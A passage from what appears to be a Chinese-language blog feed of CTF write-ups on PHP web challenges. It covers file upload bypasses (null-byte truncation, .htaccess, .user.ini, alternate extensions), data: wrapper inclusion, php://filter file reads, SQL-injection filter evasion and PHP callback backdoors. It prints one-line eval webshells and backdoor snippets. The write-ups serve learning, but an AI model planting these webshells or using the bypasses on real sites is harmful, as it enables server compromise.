        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>代码放在源码里了</p><p>先说我做的时候卡的第一个点是：</p><p>我想连接他的数据库，但是因为installLock.txt已经在data这个文件里存在了所以就会</p><p><img src="1.PNG"></p><p>exit…</p><p>我当时想的是要怎么删除</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>完美的缺点</title>
      <link href="/2021/06/04/%E5%AE%8C%E7%BE%8E%E7%9A%84%E7%BC%BA%E7%82%B9/"/>
      <url>/2021/06/04/%E5%AE%8C%E7%BE%8E%E7%9A%84%E7%BC%BA%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>做题随记，等做出来后在进行总结整理</p><p><img src="1.PNG"></p><p><img src="2.PNG"></p><p>那么如果有没有可能这就是路径</p><p><img src="3.PNG"></p><p><img src="4.PNG"></p><p>实验成功哈哈哈哈哈哈哈</p><p>但是出现问题了，这道题目有open_basedir的限制。。。根本就无法在/c/t/f/s/h/o/w/这里面做文章</p><p><img src="5.PNG"></p><p>现在的当务之急就是想着怎么绕过这个open_basedir</p><p>我这里思路错了，</p><p>先贴出来源码</p><pre><code> highlight_file(__FILE__);  error_reporting(0); ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;); $file_name = substr($_GET[&#39;file_name&#39;], 0,16); $file_content=substr($_GET[&#39;file_content&#39;], 0,32); file_put_contents(&#39;/c/t/f/s/h/o/w/&#39;.$file_name, $file_content); if(file_get_contents(&#39;php://input&#39;)===&#39;ctfshow&#39;)&#123; include($file_name); &#125;</code></pre><p><img src="6.png"></p><p><img src="7.png"></p><p><img src="8.png"></p><p>然后还有学到data的为协议，这种写法以前还没有见过</p><pre><code>data:,&lt;?=`nl *`;</code></pre><p>需要进行编码</p><p><img src="9.PNG"></p><p>#反思</p><p>感觉自己的思维还是不开阔，很容易陷入到了某种思路里面就出不来了，导致题目没有做出来</p><p>如果没有进行目录限制的话是可以利用目录穿越的来写文件的</p><p><img src="10.PNG"></p><p><img src="11.PNG"></p><p>但是很显然没有必要这样做，文件包含的话可以直接用data协议。。。</p><p>希望下次当一个思路被堵着的话可以很好的转换思路。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>babyphp</title>
      <link href="/2021/06/04/babyphp/"/>
      <url>/2021/06/04/babyphp/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>开心开心开心开心开心开心开心开心开心啊啊啊啊啊啊啊啊啊啊啊太开心啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦哈哈哈哈哈哈哈哈哈哈哈哈哈</p><span id="more"></span><p>源码</p><pre><code>&lt;?phpclass fileUtil&#123;private $name;private $content;//这属性是私有的public function __construct($name.$content=&#39;&#39;)&#123;//这里我在想好像是如果content传值了就按它传的值来要是没有就默认为‘ ’    $this-&gt;name=$name;    $this-&gt;content=$content;    ini_set(&#39;open_basedir&#39;,&#39;/var/www/html&#39;);//将用户的访问限制在/var/www/html下&#125;//这一块就是完成了赋值，然后限制用户的访问路径public function file_upload()&#123;    if($this-&gt;waf($this-&gt;name)&amp;&amp;$this-&gt;waf($this-&gt;content))&#123;        return file_put_contents($this-&gt;name,$this-&gt;content);//这里我想到了可以上传木马，现在的问提示我该怎么绕过哪个case    &#125;else&#123;        return 0;    &#125;&#125;//我感觉这里就是漏洞利用的点private function waf($input)&#123;    return !preg_match(&#39;php/i&#39;,$input);&#125;public function file_download()&#123;    if(file_exists($this-&gt;name))&#123;        header(&#39;Content-Type: application/octet-stream&#39;);        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.$this-&gt;name.&#39;&quot;&#39;);        header(&#39;Content-Transfer-Encoding: binary&#39;);        echo file_get_contents($this-&gt;name);    &#125;else&#123;        return False;    &#125;&#125;public function __destruct()&#123;&#125;&#125;$action=$_GET[&#39;a&#39;]?$_GET[&#39;a&#39;]:highlight_file(__FILE__);//传入一个参数aif($action===&#39;upload&#39;)&#123;die(&#39;Permission denied&#39;);//为什么这里会把upload过滤掉，并且是强等于&#125;switch($action)&#123;case &#39;upload&#39;:$name=$_POST[&#39;name&#39;];$content =$_POST[&#39;content&#39;];//传入两个参数$ft=new fileUtil($name,$content);//new了一个类if($ft-&gt;file_upload())&#123;    echo $name.&#39;upload success!&#39;;&#125;break;case &#39;download&#39;:$name=$_POST[&#39;name&#39;];$ft=new fileUtil($name,$content);//又new了相同的类，但是这次content为空if($ft-&gt;file_download()===False)&#123;    echo $name.&#39;download failed&#39;;&#125;break;default:echo &#39;baby come on&#39;;break;&#125;/*1.为什么这里会把upload过滤掉，并且是强等于，强等于就可以进行绕过2.是不是有两个功能，一个是长传，一个是下载，但是下载里面是强等于false，并且conten的值为空如果我是用download出问题的地方就是我不知道flag在哪里藏着*/</code></pre><p>这是我当时分析代码写的，仔细的看过后感觉代码里面的漏洞点出再了file_put_contents,这个函数是将字符串写进文件里面</p><p>我要实现这个的话需要再switch那里面触发upload,然后触发类，执行这个函数，但是我们有看到，题目用强等于将upload过滤了，向群主咨询，他说这就是题目骚的地方。。。</p><p>我当时又想到是说case会不会是弱类型比较，因为着很容易想到通过这个去绕过，但是我输入upload1什么之类的没有成功，因为我记错知识了</p><p><a href="https://ckylsy.github.io/2021/02/02/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/">自己以前写的博客</a></p><p>如果什么都不输入的话就直接跳转到upload这里，成功绕过</p><p>然后我们就该想要怎么上传了</p><p>等等等</p><p>我看了群主的WP，学到了一个小tips，有一个漏洞点我以前没有见到过$action=$_GET[‘a’]?$<em>GET[‘a’]:highlight_file(__FILE_</em>);</p><p>这里，我明白了当时问群主的时候，群主说什么都不用传的原因了，这个是一个三元运算符，如果传递了a的值得话$action就等于我们传递的值，如果没有传递的话$action=highlight_file(<strong>FILE</strong>),在我的认知里着玩意不就是高亮显示嘛，怎么还有别的用途。</p><p><img src="1.PNG"></p><p>如果我们什么都不传递，那么$action就等于true</p><p><img src="2.png"></p><p>这里只记录一下我搞错的</p><p>true:-1，“-1”（true），null,array(),””(false)</p><p><img src="3.PNG"></p><p>false正好跟true都反着</p><p><img src="4.PNG"></p><p>0:null,”php”,””(true),array（）（false）</p><p>null:””,array()(true),”php”(false)</p><p>然后就是上传文件，就是这里群主让我在好好看看ctfshow的题目，我当时又想到上传.user.ini但是当时不知到上传机制是什么，因为当时确实对这个没有什么好的学习</p><p>构造payload<br>    ?name=.user.ini&amp;&amp;content=atoi_prepend_file=1.png<br>    ?name=1.png$$content=<?=`ls`?></p><p>成功，在upload目录下找到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP回调后门</title>
      <link href="/2021/06/03/PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8/"/>
      <url>/2021/06/03/PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>只是很简单的记录，原文连接再ctfer-文件上传，里面可以找到</p><span id="more"></span><p>今天做CG得题目得时候遇到了array_walk，存在着回调后门，细致学习一下</p><h2>什么是回调函数</h2><p>回调函数得意思就是将一个函数作为一个参数传递到另一个函数的函数，比如call_user_func,call_user_func_array,array_map，这些函数可以将函数作为参数，执行后返回给主函数，方便使用，那如果传入的是危险函数，就可能会引起后门</p><h2>传统的回调函数</h2><p>call_user_func(),它第一个参数是回调函数，第二个参数是回调函数的参数，返回值是回调函数的结果</p><blockquote><p>call_user_func(‘assert’,$_REQUEST[‘PASS’]);</p></blockquote><p>与它类似的还有call_user_func_array(),与第一个的区别就是说，这个可以传入数组</p><h2>单个参数回调后门</h2><blockquote><p>注意这个单个参数是指回调函数的参数个数</p></blockquote><p>array_filter</p><p>这个函数第一个参数是一个数组，第二个参数是回调函数，就是函数会遍历这个数组，然后将数组的值传入到回掉函数中</p><blockquote><p>$e=$_GET[‘e’];</p><p>$arr=array($_POST[‘pass’]);</p><p>array_filter($arr,$e);</p></blockquote><p>array_map同上</p><h2>两个参数回调后门</h2><p>uasort</p><blockquote><p>$e=$_GET[‘e’];</p><p>$arr=array(‘test’,$_POST[‘pass’]);</p><p>uasort($arr,$e);</p></blockquote><p>感觉两个参数回调后门，好似个上一个单个参数回调后门挺像的哈，就是数组里的个数不一样</p><p>uksort类似</p><h2>三个参数回调后门</h2><p>array_walk($array,callback,userdata)如果提供了可选参数，将被选作userdata,作为第三个参数传递给callback</p><p><img src="1.PNG"></p><blockquote><p>$e=$_REQUEST[‘e’];</p><p>$arr=array($_POST[‘pass’]=&gt;’|.*|e’);</p><p>array_walk($arr,$e,’’);</p></blockquote><p>这个需要配和preg_replace来使用</p><p>相当于执行preg_replace(‘|.*|e’,$_POST[‘pass’],’’)</p><p><img src="2.PNG"></p><p>再说一个只是点，preg_replace\e模式</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfer-文件上传</title>
      <link href="/2021/06/02/ctfer-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1/"/>
      <url>/2021/06/02/ctfer-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><pre><code>&lt;?php$file=$_FILE[&#39;file&#39;];move_upload_file($file[&#39;tmp_name&#39;],$file[&#39;name&#39;])；</code></pre><p>move_upload_file：将上传的文件移动到新的位置，第一个元素：需要上传的文件，第二个元素：将元素上传的位置</p><h2>00截断</h2><p>使用场景：<br>后端首先获得了用户上传的文件名，如x.php\00.jpg,再根据文件名获得文件实际的后缀；通过后缀的白名单校验后，最终再保存文件时发生截断，实现上传的文件为x.php</p><p>但实际上如果php使用$_file注册上传的时候并不存在这个问题，因为再$_file这里已经实现了截断</p><p>关于00截断，这里涉及到一道题目</p><p><a href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html">题目地址</a></p><p>不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件可以看到，只能上传这些文件</p><p>然后上传试一下</p><p><img src="1.PNG"></p><p>看一下响应头</p><pre><code>&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt;&lt;body&gt;Array(    [0] =&gt; .png    [1] =&gt; png)Upload: 1.png&lt;br /&gt;Type: image/png&lt;br /&gt;Size: 0.0234375 Kb&lt;br /&gt;Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) &#123;  [&quot;dirname&quot;]=&gt;  string(9) &quot;./uploads&quot;  [&quot;basename&quot;]=&gt;  string(5) &quot;1.png&quot;  [&quot;extension&quot;]=&gt;  string(3) &quot;png&quot;  [&quot;filename&quot;]=&gt;  string(1) &quot;1&quot;&#125;&lt;br&gt;必须上传成后缀名为php的文件才行啊！&lt;br&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>array这里面把截出来后缀，和不带点的后缀，猜测是不是从后面开始截断，碰到点就结束，然后第二次截断，去掉点。</p><p>后面哪个array（4），第一个把截出来原有的路径，第二个全称，第三个后缀，第四个不带后缀的文件吗，我们尝试一下可不可以用00截断</p><p><img src="2.PNG"></p><p>好像并没有实现截断，那该怎么办呢。。。。。</p><p>请求查看WP，然后学习了一篇文章</p><p>我们为什么要使用00截断，是因为，我们上传时后端进行了检测，我们可以手动添加00截断，截断掉后面的东西，而后面的东西又可以帮助我们绕过检测</p><p>使用条件：</p><blockquote><p>php&lt;5.3.29,且GPC关闭</p></blockquote><h2>00截断的利用方法</h2><p>上传文件后端检测的代码：</p><pre><code>$uploaded_name = $_FILES[ &#39;file&#39; ][ &#39;name&#39; ];$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); // 提取上传文件后缀$target_name = md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; // 对上传文件进行重命名if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; )) &#123;  move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],$dir . $target_name); // 将临时文件移动到指定目录$result = $dir . $target_name;echo &quot;Stored in: $result&quot;; &#125;else&#123;echo &quot;Invalid file&quot;;&#125;</code></pre><p>刚才我在文件名中加上了%00进行了截断，看到有师傅说这是不对的</p><p>就是刚才看书里说的，上传用到了FILE，如果说文件名时1.php%00.jpg，file就会直接把%00后面的东西去掉了，那么我们时上传不上去的</p><p>那么再什么时候00截断才可以使用呢？数据爆中必需含有上传后文件的目录情况才可以使用，比如再数据包中存在path：uploads/，那么攻击者可以通过修改path的值来构造payload：uploads/1.php%00</p><p>刚才那道题目就符合这个</p><p>为什么这样可以，我想了一下</p><p>刚才看了源码也知道，如果通过了白名单检测，就会将我们的文件名拼接到路径后面。如果我们构造的路径是upload/1.php%00，那么拼接的结果就是upload/1.php%001.jpg，然后进行00截断变成了upload/1.php那我们就可以getshell</p><p>然后我尝试把payload：upload/1.php%00</p><p>但是依旧不对</p><p>继续看文章</p><li>%00(urldecode)<p>首先解释为什么要进行urldecode操作呢？其原因在于上传的表单中有一个enctype的属性，并且需要enctype=”multipart/form-data” (不对表单中数据进行编码)，path大多数都是存放在表单中的，因此需要在数据包中进行urldecode操作使%00变成字符串结束符号。</p><p><img src="3.PNG"></p><p><img src="4.PNG"></p><p>原来%00就是已经编码过的，它原来是ascii表示0，而0作为特殊字符保留，作为字符串的结束，所以因为提交的表单不对表单的数据进行编码，而且path大多是存在表单的，所以需要对%00进行解码。。。因为ascii原本是不可见字符</p><p><img src="6.png"></p><p>拿到flag</p><h2>文件后缀黑名单校验的绕过</h2><h3>上传文件重命名</h3><p>写一下后端检测的代码：</p><pre><code>&lt;?php$file=$_FILE[&#39;file&#39;];$name=$file[&#39;name&#39;];$ext=substr(strrchr($name,&#39;.&#39;),1);$dir=&#39;upload/&#39;;if(in_array($ext,array(&#39;php&#39;,&#39;asp&#39;,&#39;jsp&#39;)))&#123;echo(&#39;Forbid!&#39;);&#125;else&#123;$saveName=$dir.time().&#39;.&#39;.$ext;move_upload_file($file[&#39;tmp_name&#39;],$saveName);exit(&#39;success&#39;);&#125;</code></pre><p>php常见的可执行后缀是：php3，php5.phtml，pht。</p><p>asp常见的可执行后缀是：cdx、cer、asa等</p><p>jsp可以尝试的是jspx</p><p>但是如果就跟昨天的拿到题目如果我们不能</p><h2>百度杯 9月场 upload</h2><p>emmmm，说是随便传。。。</p><p>上传jpg，改后缀，上传成功</p><p>but！</p><p><img src="5.PNG"></p><p>很显然&lt;?php,没了。。试试短标签</p><p><img src="6.PNG"></p><p>震惊！！！把&lt;?给过滤了</p><p>那么就很显然过滤php跟&lt;?</p><p>可以用到前面的知识</p><p>用phtml，进行写入一句话木马</p><pre><code>&lt;script language=&quot;PHP&quot;&gt;@eval($_POST[1]);&lt;/script&gt;</code></pre><p>前面哪个php改为大写就可以了</p><script language="PHP">@eval($_POST[1]);</script><script language="PHP"> @eval($_POST[1]);</script><h2>.htaccess</h2><p>其实以前做题的时候也碰见过.htaccess，当时感觉自己就很急，然后就看玩WP之后就直接抄上去，然后刚才看了资料，就了解了很多</p><p>.htaccess再我的理解上，就是相当于一个文件配置，就是说让用户自己去通过上传文件来进行进行有助于我们进行下一步上传木马的操作</p><p>sethandler application/x-httpd-php</p><p>然后我们再进行下一步的上传，x-httpd-php是将所有上传的文件以php的形式进行解析，完成上传</p><h2>.user.ini</h2><p>.user.ini在我的理解下，就是简单的说，我感觉就是像是php.ini，不过user.ini就像是让用户自己上传，然后进行配置文件</p><p>上传的php.ini中应该包含着三部分</p><p>GIF89A绕过对图片的检测</p><p>其实这个可以</p><p>auto_prepend_file:指定一个文件，再任何php文件运行之前就把该文件包含进来</p><p>auto_append_file:类似前一项，区别是包含目标文件再php尾部执行。</p><h2>第三届“百越杯”福建省高校网络空间安全大赛Do you know upload？</h2><p>是这样子的，当我试图上传php然后被ban，然后直接再bp那里将.php改为了.png，失败后，我感觉emmm，我可以投个懒，直接再bp那里爆破，就方便很多了</p><p>然而。。。。</p><p>它一直都是文件不符合要求？？？我把php,txt,jpg,jpeg,png,php3,php5,phtml,gif,zip都试过后，竟然都上传不了，我就在想，这题这么nb？？？说是文件上传，但是啥都不能传，这题有毛病吧</p><p>看WP，对不起我错了，是我有毛病！！！</p><p>我为啥子要闲着没事用bp爆破。。。。。上传一个文件不好吗</p><p>以后还是老老试试的来吧</p><p>但是当我重新上传之后，然后因为这里</p><p><img src="8.PNG"></p><p>我在想，是不是是那个今天上午学的那个文件上传%00截断？？？但是就很奇怪，一旦上传成功就连上去了，当我以为这道题目到此为值得时候，我发现，它竟然没有flag.php着一类的文件夹！！！</p><p>当我尝试学着前几天看feng师傅的WP学到的新知识用find命令进行查找的时候，很显然没有找到</p><p><img src="9.PNG"></p><p>然后我每班法了，就只好求助WP</p><p>然后，我漏了一个config.php，是我不识泰山。。。。。刚才您这座这么重要的大山就在我傍边静静的站着，我竟然没有看到。。。。。。一句nb从给我自己</p><p>config.php是数据库的配置文件，有经验的师傅看到后肯定都会上数据库上想，但是想我这种菜狗，只能眼睁睁的错过这么好的提示信息。</p><pre><code>&lt;?phperror_reporting(0);session_start();$servername = &quot;localhost&quot;;$username = &quot;ctf&quot;;$password = &quot;ctfctfctf&quot;;$database = &quot;ctf&quot;;// åˆ›å»ºè¿žæŽ¥$conn = mysql_connect($servername,$username,$password) or die(&quot; connect to mysql error&quot;);mysql_select_db($database);?&gt;</code></pre><p>这段代码就是告诉了我们登录数据库的用户名与密码。。。我万万没想到的是，蚁剑竟然也可以登录数据库。。。只能说，我对这个工具的了解还是太少了，真的是爱了爱了</p><p><img src="10.PNG"></p><h3>方法二，使用大马</h3><p>说实在，大马这玩意，我还真的没有使用过，因为一般文件上传用小马就可以了</p><h2>XLcteam 客户留言板</h2><p>先说功能<br>1.留言搜索</p><p>回显：万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~<br>url :so.php</p><p>2.留言</p><p>需要填写：昵称以及内容，可以进行预览，预览的时候有提示：(提示:再次提醒，xss不保证可以成功,允许留言是为了增加娱乐性，换条思路吧!，因为我也不会xss- -~) （很好，我也不会xss,nice）</p><p>url:say.php?nice=cky&amp;usersay=show+databases()&amp;Submit=确认提交</p><p>预览里面还有一个：preview.php</p><p>3.cms说明</p><p>回显：</p><pre><code>很明显，这是安装后留下来忘删除的文件。。。 至于链接会出现在主页上，这就要问管理员了。。。 ===============================华丽的分割线============================= 本CMS由Funny公司开发的公司留言板系统，据本技术总监说，此CMS采用国际 顶级的技术所开发，安全性和实用性杠杠滴~&lt;/br&gt; 以下是本CMS各文件的功能说明（由于程序猿偷懒，只列了部分文件） config.php：存放数据库信息，移植此CMS时要修改 index.php：主页文件 passencode.php：Funny公司自写密码加密算法库 say.php：用于接收和处理用户留言请求 sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索，我在这里给出admin表结构 create table admin ( id integer, username text, userpass text, ) ======================================================================== 下面是正经的： 本渗透测试平台由：三只小潴(root#zcnhonker.net)&amp; 冷爱(hh250@qq.com)开 发.由你们周老大我辛苦修改，不能题目都被AK嘛，你们说是不是。所以这一题。。你们做出来也算你们吊咯。 </code></pre><p>url：about.php?file=sm.txt</p><p>这句话给的提示有：有一个config.php（存放数据库的信息），有个index.php,主页文件是：passencode.php,加密算法库：say.php,用于接收和处理用户留言请求的sm.txt，给了admin表的结构create table admin(id integer,username text,iserpass text);</p><p>并且这个页面看起来好像存在任意文件读取漏洞。。。</p><p>/about.php?file=php://filter/read=convert.base64-encode/resource=so.php</p><pre><code>    &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;搜索留言&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;div id=&quot;say&quot; name=&quot;say&quot; align=&quot;left&quot; style=&quot;width:1024px&quot;&gt;&lt;?phpif($_SERVER[&#39;HTTP_USER_AGENT&#39;]!=&quot;Xlcteam Browser&quot;)&#123;echo &#39;万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~&#39;;exit();&#125;$id=$_POST[&#39;soid&#39;];include &#39;config.php&#39;;include &#39;antiinject.php&#39;;include &#39;antixss.php&#39;;$id=antiinject($id);$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;不能连接到数据库！！&quot;.mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query(&quot;SELECT * FROM `message` WHERE display=1 AND id=$id&quot;);$rs=mysql_fetch_array($result);echo htmlspecialchars($rs[&#39;nice&#39;]).&#39;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#39;.antixss($rs[&#39;say&#39;]).&#39;&lt;br /&gt;&#39;;mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt;&lt;/div&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>在这里面我可以看到了他公司的浏览器是：Xlcteam Browser<br>这个里面倒是没有什么</p><p>但是当我尝试读config.php的时候，发现它提示到file参数不能为空，如果我尝试读取一个不存在的文件，那么不会有任何回显，但是现在它有提示，就说这个东西被过滤了，应该还是不置换为空了，但是当我进行双写绕过的时候，提示file的内容不能为空，确实让人奇怪</p><p>于是我读取了antiinject.php</p><pre><code>&lt;?phpfunction antiinject($content)&#123;$keyword=array(&quot;select&quot;,&quot;union&quot;,&quot;and&quot;,&quot;from&quot;,&#39; &#39;,&quot;&#39;&quot;,&quot;;&quot;,&#39;&quot;&#39;,&quot;char&quot;,&quot;or&quot;,&quot;count&quot;,&quot;master&quot;,&quot;name&quot;,&quot;pass&quot;,&quot;admin&quot;,&quot;+&quot;,&quot;-&quot;,&quot;order&quot;,&quot;=&quot;);$info=strtolower($content);for($i=0;$i&amp;lt;=count($keyword);$i++)&#123; $info=str_replace($keyword[$i], &#39;&#39;,$info);&#125;return $info;&#125;?&gt;</code></pre><p>这里面提供了过滤机制：select,union,and,from,空格，’,””,;,char,or,count,master,name,pass,admin,+,-order,=</p><pre><code>&lt;?phpfunction antixss($content)&#123;preg_match(&quot;/(.*)\[a\](.*)\[\/a\](.*)/&quot;,$content,$url);$key=array(&quot;(&quot;,&quot;)&quot;,&quot;&amp;&quot;,&quot;\\&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;&#39;&quot;,&quot;%28&quot;,&quot;%29&quot;,&quot; on&quot;,&quot;data&quot;,&quot;src&quot;,&quot;eval&quot;,&quot;unescape&quot;,&quot;innerHTML&quot;,&quot;document&quot;,&quot;appendChild&quot;,&quot;createElement&quot;,&quot;write&quot;,&quot;String&quot;,&quot;setTimeout&quot;,&quot;cookie&quot;);//因为太菜，很懒，所以。。。(过滤规则来自Mramydnei)$re=$url[2];if(count($url)==0)&#123;return htmlspecialchars($content);&#125;else&#123;for($i=0;$i&amp;lt;=count($key);$i++)&#123;$re=str_replace($key[$i], &#39;_&#39;,$re);&#125;return htmlspecialchars($url[1],ENT_QUOTES).&#39;&lt;a href=&quot;&#39;.$re.&#39;&gt;&#39;.$re.&#39;&lt;/a&gt;&#39;.htmlspecialchars($url[3],ENT_QUOTES);&#125;&#125;</code></pre><p>emmmmm应该是xss，但是题目也提示说了，不需要xss，于是我先放弃了，继续看下去</p><p>读取了about.php</p><pre><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;?php$file=$_GET[&#39;file&#39;];if($file==&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123;//果然config.php被过滤了echo &quot;file参数不能为空！&quot;;exit();&#125;else&#123;$cut=strchr($file,&quot;loginxlcteam&quot;);if($cut==false)&#123;$data=file_get_contents($file);$date=htmlspecialchars($data);echo $date;&#125;else&#123;echo &quot;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;/script&gt;&quot;;&#125;&#125;</code></pre><p>嘿嘿直接</p><p><img src="11.PNG"></p><p>嘿嘿，万能密码没有登上去，先试试读取say.php</p><pre><code>    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;?phpinclude &#39;config.php&#39;;$nice=$_POST[&#39;nice&#39;];$say=$_POST[&#39;usersay&#39;];if(!isset($_COOKIE[&#39;username&#39;]))&#123;setcookie(&#39;username&#39;,$nice);setcookie(&#39;userpass&#39;,&#39;&#39;);&#125;$username=$_COOKIE[&#39;username&#39;];$userpass=$_COOKIE[&#39;userpass&#39;];if($nice==&quot;&quot; || $say==&quot;&quot;)&#123;echo &quot;&lt;script&gt;alert(&#39;昵称或留言内容不能为空！(如果有内容也弹出此框，不是网站问题喔~ 好吧，给个提示：查看页面源码有惊喜！)&#39;);&lt;/script&gt;&quot;;exit();&#125;$con = mysql_connect($db_address,$db_user,$db_pass) or die(&quot;不能连接到数据库！！&quot;.mysql_error());mysql_select_db($db_name,$con);$nice=mysql_real_escape_string($nice);$username=mysql_real_escape_string($username);$userpass=mysql_real_escape_string($userpass);$result=mysql_query(&quot;SELECT username FROM admin where username=&#39;$nice&#39;&quot;,$con);$login=mysql_query(&quot;SELECT * FROM admin where username=&#39;$username&#39; AND userpass=&#39;$userpass&#39;&quot;,$con);if(mysql_num_rows($result)&gt;0 &amp;amp;&amp;amp; mysql_num_rows($login)&lt;=0)&#123;echo &quot;&lt;script&gt;alert(&#39;昵称已被使用，请更换！&#39;);&lt;/script&gt;&quot;;mysql_free_result($login);mysql_free_result($result);mysql_close($con);exit();&#125;mysql_free_result($login);mysql_free_result($result);$say=mysql_real_escape_string($say);mysql_query(&quot;insert into message (nice,say,display) values    (&#39;$nice&#39;,&#39;$say&#39;,0)&quot;,$con);mysql_close($con);echo &#39;&lt;script&gt;alert(&quot;构建和谐社会，留言需要经过管理员审核才可以显示！&quot;);window.location = &quot;./index.php&quot;&lt;/script&gt;&#39;;?&gt;</code></pre><p>由此看了，这个留言版就只能自己注入了</p><p>尝试一下fuzz</p><p>什么都没有被过滤，然后我使用admin作为用户名登录的时候，提示我说，密码的长度不一致，牛啊牛啊，我从1输到20多个1，一直都是长度不一致</p><p>现在又又一个问题，当我输入admin’ #的时候提示用户名不存在？？？</p><p>然后看了一眼WP，感觉自己还是不够细心，刚才抓包的时候应该就应该看见它的用户名是username，密码是namepass，不就是</p><p><img src="12.PNG"></p><p>那么我们就应该想怎么找到注入点吧，这些东西爆出来</p><p>然后就应该想到say.php这里，刚才也看了它有select这类东西的过滤</p><p><img src="13.PNG"></p><p>然后测试回显点在哪里用union select，不能用order，因为or也被过滤了，它是按照先后顺序进行过滤的，先把or替换为空，然后再将order替换为空，就用union select来进行。然后这里get到了一个新的知识</p><p><img src="14.PNG"></p><p><img src="15.PNG"></p><p>admin~102 117 99 107 114 117 110 116 117</p><p>然后天真的我就直接去登录了，没有丝毫的怀疑，就不感觉密码不对劲马！！！</p><p>fuckruntu</p><p><img src="17.PNG"></p><p>然后，这道题让我知道了我思维是有多么的不缜密，因为当我看到有提示说它再根目录下放了马，我的第一反应就是直接再url中查看，但是界面是一片空白，就。。。应该想到about.php那里的那个?file,可以直接查看</p><pre><code>&lt;?php$e = $_REQUEST[&#39;www&#39;];$arr = array($_POST[&#39;wtf&#39;] =&gt;&#39;|.*|e&#39;,);array_walk($arr, $e, &#39;&#39;);?&gt;</code></pre><p>看不懂。。。</p><p>查资料，查资料</p><p>array_walk — 使用用户自定义函数对数组中的每个元素做回调处理</p><p>emmmm，通常这个解释我是看不懂的，再网上找了两篇文章拜读了一下，是关于PHP回调后门的。</p><p><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">P神</a></p><p>这个代码和p神写的一样</p><p>array_walk的回调格式是需要三个参数的</p><blockquote><p>php中，可以执行代码的函数：</p></blockquote><blockquote><p>一个参数：assert</p><p>两个参数：assert （php5.4.8+）</p><p>三个参数：preg_replace /e模式</p></blockquote><p>所以可以使用preg_replace</p><p><a href="http://cms.nuptzj.cn/%E6%81%AD%E5%96%9C%E4%BD%A0%E8%8E%B7%E5%BE%97flag2.txt">http://cms.nuptzj.cn/%E6%81%AD%E5%96%9C%E4%BD%A0%E8%8E%B7%E5%BE%97flag2.txt</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-文件上传</title>
      <link href="/2021/06/01/ctfshow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/06/01/ctfshow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
